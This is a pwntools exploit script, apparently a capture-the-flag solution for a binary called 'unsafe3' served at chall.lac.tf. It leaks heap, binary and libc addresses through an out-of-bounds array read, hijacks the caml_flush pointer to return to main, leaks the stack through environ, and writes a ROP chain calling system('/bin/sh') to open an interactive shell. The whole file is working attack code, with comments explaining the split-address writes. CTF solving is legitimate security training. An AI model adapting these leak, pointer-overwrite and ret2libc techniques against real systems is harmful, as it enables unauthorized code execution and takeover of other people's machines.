from pwn import *
from icecream import ic

elf = exe = ELF("./unsafe3")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("chall.lac.tf", 31271)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

def leak(ind):
    sla(b"leak where\n", str(ind).encode())
    ru(": ")
    leak = int(rl().strip())*2
    return leak

def write(ind, val):
    sla(b"input index-value pairs please", str(ind).encode())
    sl(str(val//2).encode())

leek = leak(65)                     # anon segment leak
ic(hex(leek))
leek2 = leak(6)
ic(hex(leek2))                      # elf leak
array_base = leek - 0x20 - (8*65)

ic(hex(array_base))


libc.address = array_base + 0x43e0  # constant offset, checked in dockerfile
if args.REMOTE:
    libc.address -= 0x50
elf.address = leek2 - 0x6b938
ic(hex(libc.address))
ic(hex(elf.address))


main = hex(elf.address + 0x204d0)   # splitting address into 2 pieces - upper and lower
lower = int(main[8:], 16) << 40     # lower 4 bytes - why split? to prevent bottom byte from being flipped to odd (if even)
upper = int(main[2:8], 16)          # upper 4 bytes - we also need to align the address, because what we overwrite also gets flipped

ic(hex(upper))
ic(hex(lower))

x = 79
if args.REMOTE:                     # environment variables diff
    x -= 5

write(x, array_base + 0x4)          # overwriting caml_flush pointer with a (misaligned) pointer to the array, which we control the value of
write(0, lower)                     
write(1, upper)

write(8, 8)                         # triggering out of bounds error, which causes caml_flush to be called, ret2main

new_base_address = array_base - 0x358   # after ret2main, array address is reallocated
stack_address = leak((libc.sym['environ'] - new_base_address)//8) - 0x30    # leaking stack thru environ
ic(hex(stack_address))
leak(79)                            # useless

write(-0x22, stack_address - 0x210 + 0x18 - 6)  # overwriting array base with return address of __get_data (which calls readint multiple times)
pause()

gad1 = hex(qgad(libc, "rdi"))
gad2 = hex(binsh(libc))
gad3 = hex(libc.sym["system"]+27-0x10)

# finale, the sequel of the weird segmented overwriting from earlier

lower1 = int(gad1[8:], 16) << 40
upper1_lower2 = int(gad1[2:8], 16) + (int(gad2[8:], 16) << 40)
upper2_lower3 = int(gad2[2:8], 16) + (int(gad3[8:], 16) << 40)
upper3 = int(gad3[2:8], 16)

ic(hex(lower1))
ic(hex(upper1_lower2))
ic(hex(upper2_lower3))
ic(hex(upper3))

write(1, lower1)
pause()
write(2, upper1_lower2)
write(3, upper2_lower3)
for i in range(7):
    write(4, upper3)


io.interactive()
